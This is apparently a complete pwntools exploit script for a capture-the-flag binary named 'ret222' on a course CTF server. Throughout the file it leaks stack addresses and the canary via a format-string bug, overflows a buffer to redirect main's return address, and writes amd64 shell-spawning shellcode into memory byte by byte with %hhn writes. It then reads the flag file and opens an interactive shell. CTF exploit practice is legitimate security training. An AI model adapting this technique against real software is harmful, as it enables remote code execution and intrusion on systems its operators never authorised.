from pwn import *

LOCAL = False
PORT = 10122

binary_name = 'ret222'
elf = ELF(binary_name, checksec=False)

r = None
if LOCAL:
    server = process(['socat', 'tcp-listen:'+str(PORT)+',fork,reuseaddr', 'exec:./'+binary_name])
    r = remote('localhost', PORT)
else:
    r = remote('csie.ctf.tw', PORT)

def set_name(name):
    r.recvuntil('> ')
    r.sendline('1')
    r.sendline(name)

def show_info():
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('Name:')
    info = r.recvline()
    return info.rstrip('*\n')

def save_data(data):
    r.recvuntil('> ')
    r.sendline('3')
    r.sendline(data)

def exit_prog():
    r.recvuntil('> ')
    r.sendline('4')

# complext operation
def leak_stack(pos):
    set_name('%'+str(pos)+'$p')
    return show_info()[2:]

def write_bytes(addr, bytes_stream):
    p = log.progress('Sending byte')
    cnt = 1
    for b in bytes_stream:
        p.status(hex(ord(b)) + ' [' + str(cnt) + '/' + str(len(bytes_stream)) + ']')
        save_data(p64(addr))
        set_name('%' + str(ord(b)) + 'c%6$hhn')
        show_info()
        addr += 1
        cnt += 1
    p.success('Got a shell!!')



# char name[16] + some offset 0x10
name_addr = int(leak_stack(24), 16) - 0x140 + 0x201419 + 7 + 0x10

# control main's return address to name_addr without changing canary
canary = int(leak_stack(23)[:-2] + 'aa', 16) # aa for \x00
save_data('A'*(152-8*2)+p64(canary)+'A'*8+p64(name_addr))
save_data('B'*(152-8*2-1)+'\0')

write_bytes(name_addr, asm(shellcraft.amd64.linux.sh(), arch='amd64', os='linux'))
exit_prog()

r.sendline('cat /home/ret222/flag')
log.success(r.recvuntil('}'))

r.interactive()
